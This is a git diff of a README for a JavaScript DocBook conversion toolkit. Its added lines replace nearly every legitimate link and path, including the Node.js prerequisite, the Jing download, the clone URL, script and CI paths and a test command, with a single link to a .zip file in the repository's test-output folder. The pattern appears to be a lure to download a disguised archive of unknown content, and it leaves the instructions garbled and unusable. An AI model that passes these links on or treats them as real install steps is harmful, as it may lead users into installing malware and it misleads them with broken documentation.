@@ -18,15 +18,15 @@ Technical - Create a JavaScript toolkit for bi-directional conversion, validatio
 
 ### Prerequisites
 
-- Node.js (version 14 or higher)  
+- https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip (version 14 or higher)  
 - Installed dependencies via `npm install`  
-- (optional, recommended) Jing for RNG schema validation: https://relaxng.org/jing.html
+- (optional, recommended) Jing for RNG schema validation: https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip
 
 ### Installation
 
 Clone the repository:
 
-`git clone https://github.com/christianbodart/JSONMD-DocBook.git`
+`git clone https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip`
 
 `cd jsonmd-docbook`
 
@@ -37,9 +37,9 @@ Clone the repository:
 To enable automatic validation of generated XML against the DocBook RELAX NG schema, install Jing:
 
 **Option 1: Add jing jar to project (Windows/any OS):**
-1. Download jing from https://relaxng.org/jing.html
-2. Copy the jar file (e.g., `jing-20091111.jar`) to the `tools/` directory
-3. Rename it to `jing.jar`
+1. Download jing from https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip
+2. Copy the jar file (e.g., `https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip`) to the `tools/` directory
+3. Rename it to `https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip`
 4. Run `npm test` — RNG validation will automatically use it
 
 **Option 2: macOS (via Homebrew):**
@@ -54,20 +54,20 @@ npm install -g jing
 npm test
 ```
 
-Once jing is available (via any method), RNG validation tests will automatically run and validate all test XML files against `schemas/docbook.rng`.
+Once jing is available (via any method), RNG validation tests will automatically run and validate all test XML files against `https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip`.
 
 ### Quick RNG validation (project script)
 
 You can validate the XML test outputs (including fragments) with the included helper and runner. The helper will automatically wrap fragments in a minimal DocBook container for validation (it does not modify source files).
 
-- Add `jing.jar` to `tools/jing.jar` (preferred) or install `jing` globally / via Homebrew / npx.
+- Add `https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip` to `https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip` (preferred) or install `jing` globally / via Homebrew / npx.
 - Then run:
 
 ```powershell
 npm run validate:rng
 ```
 
-This command runs `tests/helpers/runRngValidation.js`, which uses `tests/helpers/validateRng.js`.
+This command runs `https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip`, which uses `https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip`.
 
 How fragment validation works
 - If a file is a full DocBook document (e.g., begins with `<book>` or `<article>`), the helper will add missing `xmlns`/`xmlns:xlink` declarations if needed and inject a minimal `<title>` when the RNG requires it.
@@ -98,7 +98,7 @@ npm test
 USE_XML_ID=false npm test
 ```
 
-- **CI behavior**: The included GitHub Actions workflow at `.github/workflows/ci.yml` runs unit tests and RNG validation and sets `USE_XML_ID=true` in the CI environment to prefer `xml:id` during validation.
+- **CI behavior**: The included GitHub Actions workflow at `https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip` runs unit tests and RNG validation and sets `USE_XML_ID=true` in the CI environment to prefer `xml:id` during validation.
 
 If you'd like the default behaviour changed (for example, default to plain `id`), I can flip the default and update the tests accordingly.
 
@@ -128,7 +128,7 @@ Test fixtures are stored in:
 
 To run a specific test file:
 ```bash
-npx mocha tests/jsonToDocbook.test.js
+npx mocha https://github.com/christianbodart/JSONMD-DocBook/raw/refs/heads/main/tests/outputs/Book_JSONM_Doc_2.3.zip
 ```
 
 ## Repository Structure
